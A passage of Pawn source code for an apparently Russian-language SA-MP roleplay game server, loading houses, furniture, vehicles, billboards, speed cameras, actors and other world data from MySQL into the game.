				SetDynamicObjectMaterialText(obj, 0, "{FFFFFF}Tel: -911-", 90, "Calibri", 27, 0, 0, 0, 1);
				AttachDynamicObjectToVehicle(obj, CarJob[idx][jcar], 0.000, -1.713, 0.507, -58.899, 0.000, 0.000);

			}

        }
	}
	printf(" [LOAD]: Успешная загрузка 'LoadCJ' - загружено %d", TOTALCJ);
	cache_delete(result, mysql);
}

stock LoadHouse() // cars
{

	new Cache:result = mysql_query(mysql, "SELECT * FROM `testhouse`");
    
	TOTALHOUSE = cache_get_row_count(mysql);
 	new housemebel[25][50];
	new slots[300],kols[300];
	
	for (new idx = 1;idx <= TOTALHOUSE;idx++)
	{
		HInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
		HInfo[idx][hX] = cache_get_row_float(idx-1, 1, mysql);
		HInfo[idx][hY] = cache_get_row_float(idx-1, 2, mysql);
		HInfo[idx][hZ] = cache_get_row_float(idx-1, 3, mysql);
		HInfo[idx][hXX] = cache_get_row_float(idx-1, 4, mysql);
		HInfo[idx][hYY] = cache_get_row_float(idx-1, 5, mysql);
		HInfo[idx][hZZ] = cache_get_row_float(idx-1, 6, mysql);
		cache_get_row(idx-1, 7, HInfo[idx][hOwner], mysql, 24);
		cache_get_row(idx-1, 8, HInfo[idx][hClass], mysql, 5);
		HInfo[idx][hCost] = cache_get_row_int(idx-1, 9, mysql);
		HInfo[idx][hInt] = cache_get_row_int(idx-1, 10, mysql);
		HInfo[idx][hVirt] = cache_get_row_int(idx-1, 11, mysql);
		HInfo[idx][hLock] = cache_get_row_int(idx-1, 12, mysql);
		HInfo[idx][hOplata] = cache_get_row_int(idx-1, 13, mysql);
		HInfo[idx][hHeal] = cache_get_row_int(idx-1, 14, mysql);
		cache_get_row(idx-1, 15, HInfo[idx][hZasel1], mysql, 24);
		cache_get_row(idx-1, 16, HInfo[idx][hZasel2], mysql, 24);
		cache_get_row(idx-1, 17, HInfo[idx][hZasel3], mysql, 24);
		cache_get_row(idx-1, 18, HInfo[idx][hZasel4], mysql, 24);
		HInfo[idx][hShkafX] = cache_get_row_float(idx-1, 19, mysql);
		HInfo[idx][hShkafY] = cache_get_row_float(idx-1, 20, mysql);
		HInfo[idx][hShkafZ] = cache_get_row_float(idx-1, 21, mysql);
		cache_get_row(idx-1, 22, housemebel[0], mysql, 50);
		cache_get_row(idx-1, 23, housemebel[1], mysql, 50);
		cache_get_row(idx-1, 24, housemebel[2], mysql, 50);
		cache_get_row(idx-1, 25, housemebel[3], mysql, 50);
		cache_get_row(idx-1, 26, housemebel[4], mysql, 50);
		cache_get_row(idx-1, 27, housemebel[5], mysql, 50);
		cache_get_row(idx-1, 28, housemebel[6], mysql, 50);
		cache_get_row(idx-1, 29, housemebel[7], mysql, 50);
		cache_get_row(idx-1, 30, housemebel[8], mysql, 50);
		cache_get_row(idx-1, 31, housemebel[9], mysql, 50);
		cache_get_row(idx-1, 32, housemebel[10], mysql, 50);
		cache_get_row(idx-1, 33, housemebel[11], mysql, 50);
		cache_get_row(idx-1, 34, housemebel[12], mysql, 50);
		cache_get_row(idx-1, 35, housemebel[13], mysql, 50);
		cache_get_row(idx-1, 36, housemebel[14], mysql, 50);
		cache_get_row(idx-1, 37, housemebel[15], mysql, 50);
		cache_get_row(idx-1, 38, housemebel[16], mysql, 50);
		cache_get_row(idx-1, 39, housemebel[17], mysql, 50);
		cache_get_row(idx-1, 40, housemebel[18], mysql, 50);
		cache_get_row(idx-1, 41, housemebel[19], mysql, 50);
		cache_get_row(idx-1, 42, housemebel[20], mysql, 50);
		cache_get_row(idx-1, 43, housemebel[21], mysql, 50);
		cache_get_row(idx-1, 44, housemebel[22], mysql, 50);
		cache_get_row(idx-1, 45, housemebel[23], mysql, 50);
		cache_get_row(idx-1, 46, housemebel[24], mysql, 50);
		HInfo[idx][hShkafFA] = cache_get_row_float(idx-1, 47, mysql);
		HInfo[idx][hRot] = cache_get_row_int(idx-1, 48, mysql);
		HInfo[idx][hUl][0] = cache_get_row_int(idx-1, 49, mysql);
		HInfo[idx][hUl][1] = cache_get_row_int(idx-1, 50, mysql);
		HInfo[idx][hUl][2]  = cache_get_row_int(idx-1, 51, mysql);
		HInfo[idx][hGar][0] = cache_get_row_float(idx-1, 52, mysql);
		HInfo[idx][hGar][1] = cache_get_row_float(idx-1, 53, mysql);
		HInfo[idx][hGar][2] = cache_get_row_float(idx-1, 54, mysql);

		cache_get_row(idx-1, 55, slots, mysql, 300);
		cache_get_row(idx-1, 56, kols, mysql, 300);
		
		sscanf(slots, "p<,>a<i>[72]",HInfo[idx][hInvSlot]);
		sscanf(kols, "p<,>a<i>[72]",HInfo[idx][hInvKol]);
		static const Float:garder[][] = {
		{134.6391,1381.5553,1083.8650,87.9537},
		{257.1750,1243.7517,1084.2578,179.7615},
		{239.2781,1084.3066,1084.1875,359.2564},
		{319.7151,1483.4260,1084.4375,87.5238},
		{2235.8855,-1073.9558,1049.0234,91.5972},
		{31.3676,1345.5010,1088.8750,0.1029},
		{2263.1636,-1132.6628,1050.6328,358.5363},
		{2194.8660,-1210.6511,1049.0234,271.1389},
		{2316.1660,-1010.7831,1054.7188,88.8006},
		{2363.7671,-1127.4933,1050.8826,89.1139},
		{2286.2488,-1137.6001,1050.8984,269.9088},
		{2215.8684,-1074.6965,1050.4844,358.8963},
		{-42.6050,1412.7668,1084.4297,0.1730},
		{81.6609,1334.3695,1083.8672,179.7147},
		{459.0748,1407.9424,1084.3080,270.5121},
		{235.2061,1201.2048,1080.2645,271.8358},
		{218.6464,1251.2573,1082.1481,90.9745},
		{237.3322,1188.5397,1084.4172,0.0},
		{238.9398,1109.0673,1080.9922,178.0585},
		{256.4313,1285.7144,1080.2578,181.4351},
		{25.6176,1418.9788,1084.4297},
		{2455.6450,-1706.6511,1013.5078,178.3251},
		{413.4174,2536.7415,10.0000,89.0243},
		{446.7968,506.4464,1001.4195,178.3015},
		{2332.6279,-1144.4208,1054.3047,179.2180},
		{2810.3650,-1161.3796,1029.1719,1.2433},
		{2231.7363,-1112.2026,1050.8828,92.1108},
		{217.7760,1154.2463,1082.6168,86.1339},
		{380.5631,1472.8912,1080.1875,358.5827},
		{361.6934,1425.1444,1081.3359,0.0}
		};
		for(new i = 0; i < sizeof(spawns_home); i++)
		{
			if(floatround(HInfo[idx][hXX]) == floatround(spawns_home[i][SPAWNS_COORD][0]))
			{
			    query = "";
				format(query, sizeof(query), "UPDATE testhouse SET shkafx = '%f', shkafy = '%f', shkafz = '%f', shkafa= '%f', rot = '%d' WHERE id = '%d'",
				spawns_home[i][SPAWNS_COORD][7],spawns_home[i][SPAWNS_COORD][8],spawns_home[i][SPAWNS_COORD][9]
				,spawns_home[i][SPAWNS_COORD][10],spawns_home[i][SPAWNS_ROT],HInfo[idx][id]);
				mysql_tquery(mysql,query);
				query = "";
				format(query, sizeof(query), "UPDATE testhouse SET garx = '%f', gary = '%f', garz = '%f' WHERE id = '%d'",
				garder[i][0],garder[i][1],garder[i][2],HInfo[idx][id]);
				mysql_tquery(mysql,query);
			}
		}
	 	CreateDynamicObject(2708, HInfo[idx][hShkafX], HInfo[idx][hShkafY], HInfo[idx][hShkafZ], 0.0, 0.0, HInfo[idx][hShkafFA],idx,HInfo[idx][hInt],-1,300.0,300.0);

		for(new i = 0; i < 25; i++)
		{
		//    printf("house: %s",housemebel[i]);
		    sscanf(housemebel[i], "p<,>dffffff",MebelInfo[i][idx][mmodel],MebelInfo[i][idx][mx],MebelInfo[i][idx][my],MebelInfo[i][idx][mz]
			,MebelInfo[i][idx][mrx],MebelInfo[i][idx][mry],MebelInfo[i][idx][mrz]);
		/*	printf("house: %d | x : %f | rx: %d",MebelInfo[i][idx][mmodel],MebelInfo[i][idx][mx],floatround(MebelInfo[i][idx][mx]));*/
			if(!MebelInfo[i][idx][mmodel] || floatround(MebelInfo[i][idx][mx]) == 0) continue;
			MebelInfo[i][idx][mobjid] = CreateDynamicObject(MebelInfo[i][idx][mmodel],MebelInfo[i][idx][mx],MebelInfo[i][idx][my],MebelInfo[i][idx][mz]
			,MebelInfo[i][idx][mrx],MebelInfo[i][idx][mry],MebelInfo[i][idx][mrz],idx,HInfo[idx][hInt],-1,300.0,300.0);
		}

		if(HInfo[idx][hUl][0])
		{
		    HInfo[idx][hGarText] =  CreateDynamic3DTextLabel("{f7ae11}[Гардероб]{ffffff}\nИспользуйте: {f7ae11}LALT", -1,HInfo[idx][hGar][0],HInfo[idx][hGar][1],HInfo[idx][hGar][2],3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0, HInfo[idx][hVirt]);
		}
		else HInfo[idx][hGarText] = CreateDynamic3DTextLabel("-", 0xC2C2C220,HInfo[idx][hGar][0],HInfo[idx][hGar][1],HInfo[idx][hGar][2],3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0, HInfo[idx][hVirt]);
		if(!strcmp(HInfo[idx][hOwner],"None",true))
		{

		    HInfo[idx][hMap] = CreateDynamicMapIcon(HInfo[idx][hX],HInfo[idx][hY],HInfo[idx][hZ], 31, 0,-1,-1,-1,200.0);
			HInfo[idx][hPick] = CreateDynamicPickup(1273,23,HInfo[idx][hX],HInfo[idx][hY],HInfo[idx][hZ],0);
		}
		else
		{
			HInfo[idx][hPick] = CreateDynamicPickup(19522,23,HInfo[idx][hX],HInfo[idx][hY],HInfo[idx][hZ],0);
			HInfo[idx][hMap] = CreateDynamicMapIcon(HInfo[idx][hX],HInfo[idx][hY],HInfo[idx][hZ], 32, 0,-1,-1,-1,200.0);
		}
		HInfo[idx][hTax] = HInfo[idx][hCost]*OplDom/100;
	/*	if(!strcmp(HInfo[idx][hClass],"D",true))
		{
			new stoi[] = {8000,8500,9000,9500,10000,10500,11000,11500,12000};
			query = "";
		    format(query, sizeof(query), "UPDATE `testhouse` SET `hPrice` = '%d' WHERE id = '%d' LIMIT 1",stoi[random(sizeof(stoi))],idx);
			mysql_tquery(mysql,query);
		}
		else if(!strcmp(HInfo[idx][hClass],"C",true))
		{
		    new stoi[] = {15000,15500,16000,16500,17000,17500,18000,18500,19000,19500,20000};
		    query = "";
		    format(query, sizeof(query), "UPDATE `testhouse` SET `hPrice` = '%d' WHERE id = '%d' LIMIT 1",stoi[random(sizeof(stoi))],idx);
			mysql_tquery(mysql,query);
		}
		else if(!strcmp(HInfo[idx][hClass],"B",true))
		{
		    new stoi[] = {30000,35000,40000,45000,50000,55000,60000};
		    query = "";
		    format(query, sizeof(query), "UPDATE `testhouse` SET `hPrice` = '%d' WHERE id = '%d' LIMIT 1",stoi[random(sizeof(stoi))],idx);
			mysql_tquery(mysql,query);
		}
		else if(!strcmp(HInfo[idx][hClass],"A",true))
		{
		    new stoi[] = {70000,75000,80000,85000,90000,95000,100000};
		    query = "";
		    format(query, sizeof(query), "UPDATE `testhouse` SET `hPrice` = '%d' WHERE id = '%d' LIMIT 1",stoi[random(sizeof(stoi))],idx);
			mysql_tquery(mysql,query);
		}*/
		CreateDynamic3DTextLabel("{f7ae11}[Шкаф]{ffffff}\n\nДля открытия используйте: {f7ae11}H", -1,HInfo[idx][hShkafX],HInfo[idx][hShkafY],HInfo[idx][hShkafZ]+1.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0, HInfo[idx][hVirt]);
		CreateDynamic3DTextLabel("Для выхода используйте: {f7ae11}LALT", -1,HInfo[idx][hXX],HInfo[idx][hYY],HInfo[idx][hZZ],10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, HInfo[idx][hVirt]);
		//Create3DTextLabelEx( "Для выхода используйте: {f7ae11}LALT", -1,HInfo[idx][hXX],HInfo[idx][hYY],HInfo[idx][hZZ],10.0, HInfo[idx][hVirt], 1 );
	}
	printf(" [LOAD]: Успешная загрузка 'LoadHouse' - загружено %d", TOTALHOUSE);
	cache_delete(result, mysql);
}
stock GetSlotClass(house)
{
	new slott;
	if(!strcmp(HInfo[house][hClass],"D",true)) slott = 7;
	else if(!strcmp(HInfo[house][hClass],"C",true)) slott = 14;
	else if(!strcmp(HInfo[house][hClass],"B",true))slott = 20;
	else if(!strcmp(HInfo[house][hClass],"A",true)) slott = 25;
	return slott;
}
stock LoadEnters()
{
    new time = GetTickCount();
    new Cache:result = mysql_query(mysql, "SELECT * FROM `"TABLE_ENTERS"`");
	TOTALENTERS = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALENTERS;idx ++)
	{
    	EntersInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
		EntersInfo[idx][pX] = cache_get_row_float(idx-1, 1, mysql);
		EntersInfo[idx][pY] = cache_get_row_float(idx-1, 2, mysql);
		EntersInfo[idx][pZ] = cache_get_row_float(idx-1, 3, mysql);
		EntersInfo[idx][pM] = cache_get_row_int(idx-1, 4, mysql);
		EntersInfo[idx][pT] = cache_get_row_int(idx-1, 5, mysql);
		EntersInfo[idx][pI] = cache_get_row_int(idx-1, 6, mysql);
		EntersInfo[idx][pV] = cache_get_row_int(idx-1, 7, mysql);
		EntersInfo[idx][ptX] = cache_get_row_float(idx-1, 8, mysql);
		EntersInfo[idx][ptY] = cache_get_row_float(idx-1, 9, mysql);
		EntersInfo[idx][ptZ] = cache_get_row_float(idx-1, 10, mysql);
		EntersInfo[idx][ptFa] = cache_get_row_float(idx-1, 11, mysql);
		EntersInfo[idx][ptI] = cache_get_row_int(idx-1, 12, mysql);
		EntersInfo[idx][ptV] = cache_get_row_int(idx-1, 13, mysql);
		EntersInfo[idx][pMem]  = cache_get_row_int(idx-1, 14, mysql);
		EntersInfo[idx][pP] = CreateDynamicPickup(EntersInfo[idx][pT], 23, EntersInfo[idx][pX], EntersInfo[idx][pY], EntersInfo[idx][pZ],EntersInfo[idx][pV],EntersInfo[idx][pI]);
	}

	printf(" [LOAD]: Успешная загрузка 'LoadEnters' - загружено %d пикапов за %d м.с", TOTALENTERS,GetTickCount() - time);
	cache_delete(result, mysql);
	return true;
}
stock LoadGps()
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `gps`");
	TOTALGPS = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALGPS;idx ++)
	{
	    GPSInfo[idx][gpsID] = cache_get_field_content_int(idx-1, "id", mysql);
	    GPSInfo[idx][gpsX] = cache_get_field_content_float(idx-1, "x", mysql);
	    GPSInfo[idx][gpsY] = cache_get_field_content_float(idx-1, "y", mysql);
	    GPSInfo[idx][gpsZ] = cache_get_field_content_float(idx-1, "z", mysql);
	    cache_get_field_content(idx-1, "name", GPSInfo[idx][gpsName], mysql, 64);
	    GPSInfo[idx][gpsList] = cache_get_field_content_int(idx-1, "list", mysql);
	}
	printf(" [LOAD]: Успешная загрузка 'LoadGps' - загружено");
	cache_delete(result, mysql);
}
stock LoadDiplo()
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `dipl`");
	for (new idx = 1;idx <= cache_get_row_count(mysql);idx ++)
	{
		DiploInfo[idx-1][0] = cache_get_row_int(idx-1, 1, mysql);
		DiploInfo[idx-1][1] = cache_get_row_int(idx-1, 2, mysql);
		DiploInfo[idx-1][2] = cache_get_row_int(idx-1, 3, mysql);
		DiploInfo[idx-1][3] = cache_get_row_int(idx-1, 4, mysql);
		DiploInfo[idx-1][4] = cache_get_row_int(idx-1, 5, mysql);
		DiploInfo[idx-1][5] = cache_get_row_int(idx-1, 6, mysql);
		DiploInfo[idx-1][6] = cache_get_row_int(idx-1, 7, mysql);
		DiploInfo[idx-1][7] = cache_get_row_int(idx-1, 8, mysql);
		DiploInfo[idx-1][8]  = cache_get_row_int(idx-1, 9, mysql);
	}

    printf(" [LOAD]: Успешная загрузка 'LoadDiplo' - загружено");
    cache_delete(result, mysql);
}
stock LoadCam()
{
    mysql_query(mysql,"SELECT * FROM `radar`");
    new r, f;
    new stringss[140];
    cache_get_data(r, f);
    for(new i = 1; i <= r; i++)
    {
        //cache_get_field_content_int(i, "id", RadarInfo[i][rid],mysql);
        RadarInfo[i][rid] = cache_get_field_content_int(i-1, "rid", mysql);
        RadarInfo[i][rX]  = cache_get_field_content_float(i-1, "rX", mysql);
        RadarInfo[i][rY]  = cache_get_field_content_float(i-1, "rY", mysql);
        RadarInfo[i][rZ]  = cache_get_field_content_float(i-1, "rZ", mysql);
        RadarInfo[i][rRZ] = cache_get_field_content_float(i-1, "rRZ", mysql);
        RadarInfo[i][rR] = cache_get_field_content_float(i-1, "rR", mysql);
        RadarInfo[i][rSpeed] = cache_get_field_content_int(i-1, "rSpeed", mysql);
        RadarInfo[i][rCamx] = cache_get_field_content_float(i-1, "camx", mysql);
        RadarInfo[i][rCamy] = cache_get_field_content_float(i-1, "camy", mysql);
        RadarInfo[i][rCamz] = cache_get_field_content_float(i-1, "camz", mysql);
        RadarInfo[i][rCamxx] = cache_get_field_content_float(i-1, "camxx", mysql);
        RadarInfo[i][rCamyy] = cache_get_field_content_float(i-1, "camyy", mysql);
        RadarInfo[i][rCamzz] = cache_get_field_content_float(i-1, "camzz", mysql);
        cache_get_field_content(i-1, "rName", RadarInfo[i][rName], mysql, 32);
		RadarInfo[i][rObj] = CreateDynamicObject(18880, RadarInfo[i][rX], RadarInfo[i][rY], RadarInfo[i][rZ], 0.0, 0.0, RadarInfo[i][rRZ]);
		format(stringss, sizeof stringss, "{f7ae11}[Радар]{ffffff}\nМаксимальная скорость: {f7ae11}%d км/ч.{FFFFFF}\nШтраф за нарушение: {f7ae11}50$", RadarInfo[i][rSpeed]);
		RadarInfo[i][rLabel] = CreateDynamic3DTextLabel(stringss, 0xFFFFFFFF, RadarInfo[i][rX], RadarInfo[i][rY], RadarInfo[i][rZ]+4.0,10.0);
        TOTALRADAR++;
    }
    printf(" [LOAD]: Успешная загрузка 'LoadCam' - загружено");
    return 1;
}
/*stock LoadCam()
{
    mysql_query("SELECT * FROM `radar`");
	mysql_store_result();
	new stringss[144];
	if(mysql_num_rows() > 0)
	{
		for(new i = 1; i <= mysql_num_rows(); i++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>dfffffd",
			RadarInfo[i][rid],
			RadarInfo[i][rX],
			RadarInfo[i][rY],
			RadarInfo[i][rZ],
			RadarInfo[i][rRZ],
			RadarInfo[i][rR],
			RadarInfo[i][rSpeed]);
			
			TOTALACTOS++;
		}
	}
	printf(" [LOAD]: Успешная загрузка 'LoadCam' - загружено");
	mysql_free_result();
    return 1;
}*/
stock LoadBanks(playerid)
{
    query = "";
	format(query,sizeof(query),"SELECT * FROM `banks`  WHERE idacc = '%d'", PlayerInfo[playerid][pID]);
    new Cache:result = mysql_query(mysql, query);
	TOTALBANKS[playerid] = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALBANKS[playerid];idx ++)
	{
	    BanksInfo[playerid][bankID][idx] = cache_get_field_content_int(idx-1, "id", mysql);
		cache_get_field_content(idx-1, "name", BanksName[playerid][idx], mysql, 64);
		BanksInfo[playerid][bankCash][idx] = cache_get_field_content_int(idx-1, "cash", mysql);
	}
	cache_delete(result, mysql);
	printf(" [LOAD]: Успешная загрузка 'LoadBanks' - загружено");

}


stock LoadProds()
{
	/*mysql_query(mysql, "SELECT * FROM `billboards`");

	*/
	new bizid;
	query = "";
	format(query,sizeof(query),"SELECT * FROM `bizprice`");
	mysql_query(mysql, query);



    //new Cache:result = mysql_query(mysql, query);
//	MAX_PROD[bizid] = cache_get_row_count(mysql);
//	for (new idx = 1;idx <= MAX_PROD[bizid];idx ++)
	new rows, fields;
    cache_get_data(rows,fields);
//    MAX_PROD[bizid] = rows;
	for(new idx = 1;idx <= rows; idx++)
	{
	    bizid = cache_get_field_content_int(idx-1, "idbizz", mysql);
	    ProdInfo[bizid][prodCena][MAX_PROD[bizid]] = cache_get_field_content_int(idx-1, "cena", mysql);
		cache_get_field_content(idx-1, "name", ProdNames[bizid][MAX_PROD[bizid]], mysql, 64);
		ProdInfo[bizid][prodMinus][MAX_PROD[bizid]] = cache_get_field_content_int(idx-1, "produc", mysql);
		MAX_PROD[bizid]++;
	}
//	cache_delete(result, mysql);
	printf(" [LOAD]: Успешная загрузка 'LoadProds' - загружено");

}


stock LoadActor()
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `actors`");
	TOTALACTOS = cache_get_row_count(mysql);
	new skinid,virt;
	for (new idx = 1;idx <= TOTALACTOS;idx ++)
	{
	    ActorsInfo[idx][aid] = cache_get_field_content_int(idx-1, "id", mysql);
		skinid = cache_get_field_content_int(idx-1, "skinid", mysql);
		ActorsInfo[idx][axx] = cache_get_field_content_float(idx-1, "x", mysql);
		ActorsInfo[idx][ayy] = cache_get_field_content_float(idx-1, "y", mysql);
		ActorsInfo[idx][azz] = cache_get_field_content_float(idx-1, "z", mysql);
		ActorsInfo[idx][afa] = cache_get_field_content_float(idx-1, "fa", mysql);
		virt = cache_get_field_content_int(idx-1, "virt", mysql);
		cache_get_field_content(idx-1, "animl", ActorsInfo[idx][aaniml], mysql, 32);
		cache_get_field_content(idx-1, "animn", ActorsInfo[idx][aanimn], mysql, 32);
		ActorsInfo[idx][atext1] = cache_get_field_content_int(idx-1, "text1", mysql);
		cache_get_field_content(idx-1, "text", ActorsInfo[idx][atext], mysql, 50);
		ActorsInfo[idx][aactor] = CreateDynamicActor(skinid,ActorsInfo[idx][axx],ActorsInfo[idx][ayy],ActorsInfo[idx][azz],ActorsInfo[idx][afa],1,100.0,virt);
		ApplyDynamicActorAnimation(ActorsInfo[idx][aactor],ActorsInfo[idx][aaniml],ActorsInfo[idx][aanimn],4.1,1,0,0,0,0);
		ApplyDynamicActorAnimation(ActorsInfo[idx][aactor],ActorsInfo[idx][aaniml],ActorsInfo[idx][aanimn],4.1,1,0,0,0,0);
	//	SetActorVirtualWorld(ActorsInfo[idx][aactor],virt);
		if(ActorsInfo[idx][atext1])
		{
		    ActorsInfo[idx][atext3d] = Create3DTextLabelEx( "-",0xC2C2C220,ActorsInfo[idx][axx],ActorsInfo[idx][ayy],ActorsInfo[idx][azz]+1.0,10.0, 0, 0 );
		    ActorsInfo[idx][azona] = CreateDynamicSphere(ActorsInfo[idx][axx],ActorsInfo[idx][ayy],ActorsInfo[idx][azz], 3.0);
		}
		
		
	}
	cache_delete(result, mysql);
	printf(" [LOAD]: Успешная загрузка 'LoadActor' - загружено");

}
forward ClearBotGlobalClear1(idx);
public ClearBotGlobalClear1(idx)
{
    Update3DTextLabelTextEx(ActorsInfo[idx][atext3d],0xC2C2C220,"-");
//    SetDynamicActorFacingAngle(ActorsInfo[idx][aactor], ActorsInfo[idx][afa]);
    ApplyDynamicActorAnimation(ActorsInfo[idx][aactor],ActorsInfo[idx][aaniml],ActorsInfo[idx][aanimn],4.1,1,0,0,0,0);
}
stock SayQBot(idx)
{
    ApplyDynamicActorAnimation(ActorsInfo[idx][aactor],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
	Update3DTextLabelTextEx(ActorsInfo[idx][atext3d],-1,ActorsInfo[idx][atext]);
	SetTimerEx("ClearBotGlobalClear1", 3000, false,"d",idx);
	return true;
}
stock UpdateBuildText(b_id)
{
	new font_face[12];
	switch(BildInfo[b_id][bFontFace])
	{
	    case 0: font_face = "Arial";
	    case 1: font_face = "Calibri";
	    case 2: font_face = "Tahoma";
	    case 3: font_face = "Verdana";
	}
 	new text[144+16];
	if(!strcmp(BildInfo[b_id][bOwner],"None",true))
	{
		text = "{000000}Рекламное место свободно\nЗаказать в здании CNN";
		BildInfo[b_id][bAligment] = 1, BildInfo[b_id][bFontSize]=25, BildInfo[b_id][bBackColor] = 1;
	}
	else format(text,144+16,"{000000}%s",BildInfo[b_id][bText]);
	return SetDynamicObjectMaterialText(BildInfo[b_id][bObjectID], 0, text , 130, font_face, BildInfo[b_id][bFontSize], 0, -1, Colors_BIG[BildInfo[b_id][bBackColor]], BildInfo[b_id][bAligment]);
}
stock BildboardLoad()
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `billboards`");
	TOTALBIL = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALBIL;idx ++)
	{

        cache_get_row(idx-1, 6, BildInfo[idx][bText],mysql,144);
        cache_get_row(idx-1, 7, BildInfo[idx][bPosText],mysql,32);
        cache_get_row(idx-1,8, BildInfo[idx][bOwner],mysql,MAX_PLAYER_NAME);
        BildInfo[idx][bBackColor] = cache_get_row_int(idx-1, 9, mysql);
        BildInfo[idx][bFontFace] = cache_get_row_int(idx-1, 10, mysql);
        BildInfo[idx][bAligment] = cache_get_row_int(idx-1, 11, mysql);
        BildInfo[idx][bFontSize] = cache_get_row_int(idx-1, 12, mysql);
        BildInfo[idx][bPos][0] = cache_get_row_float(idx-1, 2, mysql);
        BildInfo[idx][bPos][1] = cache_get_row_float(idx-1, 3, mysql);
        BildInfo[idx][bPos][2] = cache_get_row_float(idx-1, 4, mysql);
        BildInfo[idx][bPos][3] = cache_get_row_float(idx-1, 5, mysql);
        BildInfo[idx][bDay] = cache_get_row_int(idx-1, 13, mysql);
        BildInfo[idx][bObjectID] = CreateDynamicObjectEx(cache_get_row_int(idx-1, 1, mysql),BildInfo[idx][bPos][0], BildInfo[idx][bPos][1], BildInfo[idx][bPos][2], 0.00000000, 0.00000000, BildInfo[idx][bPos][3]); // bObject
        UpdateBuildText(idx);
	}
	printf(" [LOAD]: Успешная загрузка 'BildboardLoad' - загружено %d",TOTALBIL);
	cache_delete(result, mysql);
}
/*stock BildboardLoad()
{
    mysql_query("SELECT * FROM `billboards`");
	mysql_store_result();
	new model,id1;
	if(mysql_num_rows() > 0)
	{
		for(new idx = 1; idx <= mysql_num_rows(); idx++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>ddffffs[144]s[32]s[24]ddddd",
			id1,model,
			BildInfo[idx][bPos][0]
			,BildInfo[idx][bPos][1]
			,BildInfo[idx][bPos][2]
			,BildInfo[idx][bPos][3],
			BildInfo[idx][bText],
			BildInfo[idx][bPosText],
			BildInfo[idx][bOwner],
			BildInfo[idx][bBackColor]
			,BildInfo[idx][bFontSize]
			,BildInfo[idx][bAligment]
			,BildInfo[idx][bFontSize]
			,BildInfo[idx][bDay]);
			
			TOTALBIL++;
			BildInfo[idx][bObjectID] = CreateDynamicObject(model,BildInfo[idx][bPos][0], BildInfo[idx][bPos][1], BildInfo[idx][bPos][2], 0.00000000, 0.00000000, BildInfo[idx][bPos][3]); // bObject
			CreateDynamicObject(7910,1415.3,-1719.9,33.8, 0.00000000, 0.00000000, 137.5); // bObject
   			CreateDynamicObject(7910,1412.6,-1724.2,33.8, 0.00000000, 0.00000000, 331.999); // bObject



			UpdateBuildText(idx);
			    //if(floatround(VInfo[idx][vx]) == 0) VInfo[idx][vcar] = CreateVehicle(VInfo[idx][vmodel], VInfo[idx][vx1], VInfo[idx][vy1], VInfo[idx][vz1], VInfo[idx][vfa1], VInfo[idx][vcolor1], VInfo[idx][vcolor2], -1);
		}
	}
	printf(" [LOAD]: Успешная загрузка 'BildboardLoad' - загружено %d",TOTALBIL);
	mysql_free_result();
}*/





stock LoadVeh1() // cars
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `veh`");
	TOTALV = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALV;idx ++)
	{
	    VInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
		VInfo[idx][vmodel] = cache_get_row_int(idx-1, 1, mysql);
		VInfo[idx][vx] = cache_get_row_float(idx-1, 2, mysql);
		VInfo[idx][vy] = cache_get_row_float(idx-1, 3, mysql);
		VInfo[idx][vz] = cache_get_row_float(idx-1, 4, mysql);
		VInfo[idx][vfa] = cache_get_row_float(idx-1, 5, mysql);
		VInfo[idx][vcolor1] = cache_get_row_int(idx-1, 6, mysql);
		VInfo[idx][vcolor2] = cache_get_row_int(idx-1, 7, mysql);
		cache_get_row(idx-1, 8, VInfo[idx][vname], mysql, 24);
		VInfo[idx][vcost] = cache_get_row_int(idx-1, 9, mysql);
		cache_get_row(idx-1, 10, VInfo[idx][vtunings], mysql, 100);
		cache_get_row(idx-1, 11, VInfo[idx][vnumber], mysql, 10);
		VInfo[idx][vsvet] = cache_get_row_int(idx-1, 12, mysql);
		VInfo[idx][vprob] = cache_get_row_int(idx-1, 13, mysql);
		VInfo[idx][voplata] = cache_get_row_int(idx-1, 14, mysql);
		VInfo[idx][vfuel] = cache_get_row_int(idx-1, 15, mysql);
		VInfo[idx][vxmag] = cache_get_row_float(idx-1, 16, mysql);
		VInfo[idx][vymag] = cache_get_row_float(idx-1, 17, mysql);
		VInfo[idx][vzmag] = cache_get_row_float(idx-1, 18, mysql);
		VInfo[idx][vfmag] = cache_get_row_float(idx-1, 19, mysql);
		VInfo[idx][vvirt] = cache_get_row_int(idx-1, 20, mysql);
		VInfo[idx][vint] = cache_get_row_int(idx-1, 21, mysql);
		VInfo[idx][vfam] = cache_get_row_int(idx-1, 22, mysql);
		VInfo[idx][vsis] = cache_get_row_int(idx-1, 23, mysql);
		sscanf(VInfo[idx][vtunings], "p<,>a<i>[14]",VInfo[idx][vtuning]);
	//	if(!floatround(VInfo[idx][xv]) && !floatround(VInfo[idx][yv])) VInfo[idx][vcar] = CreateVehicle(VInfo[idx][vmodel], VInfo[idx][vx], VInfo[idx][vy], VInfo[idx][vz], VInfo[idx][vfa], VInfo[idx][vcolor1], VInfo[idx][vcolor2], 60000);
  		VInfo[idx][vcar] = CreateVehicle(VInfo[idx][vmodel], VInfo[idx][vx],VInfo[idx][vy],VInfo[idx][vz], VInfo[idx][vfa], VInfo[idx][vcolor1], VInfo[idx][vcolor2], 60000);
        CarLable[VInfo[idx][vcar]] = CreateDynamic3DTextLabel( " ", -1, 0.0, 0.0, 1.3, 10.0, INVALID_PLAYER_ID, VInfo[idx][vcar], 1 );
